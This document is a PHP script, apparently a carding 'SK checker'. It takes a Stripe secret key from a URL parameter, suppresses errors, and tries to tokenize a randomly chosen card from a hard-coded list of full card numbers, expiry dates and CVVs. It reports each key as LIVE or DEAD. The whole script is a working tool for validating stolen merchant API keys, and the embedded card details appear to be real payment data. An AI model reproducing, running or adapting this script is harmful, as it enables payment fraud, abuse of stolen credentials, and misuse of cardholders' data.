<?php

error_reporting(0);

if (empty($_GET['sk'])) {
    die('No SK specified');
}

$sk = $_GET['sk'];
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Authorization: Bearer '.$sk;
$headers[] = 'User-Agent: '.$_SERVER['HTTP_USER_AGENT'];
$cards = array();
$cards[] = '4400662665658543|02|2025|467';
$cards[] = '4400660338462681|12|2024|107';
$cards[] = '4400663772030782|09|2026|140';
$cards[] = '4400667378074656|06|2025|807';
$cards[] = '5101554114665030|11|2025|478';
$cards[] = '5101556243824008|11|2026|368';
$cards[] = '5101553810878210|05|2026|677';
$cards[] = '5101550383326536|01|2025|283';
$random_cc = $cards[array_rand($cards)];
$card = explode('|', $random_cc)[0];
$month = explode('|', $random_cc)[1];
$year = explode('|', $random_cc)[2];
$cvv = explode('|', $random_cc)[3];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$card.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[cvc]='.$cvv);
$response = curl_exec($ch);

if (strpos($response, '"error":')) {
    $code = json_decode($response, true)['error']['code'];
    die('DEAD - '.$sk.' - '.$code);
} else {
    die('LIVE - '.$sk);
}

?>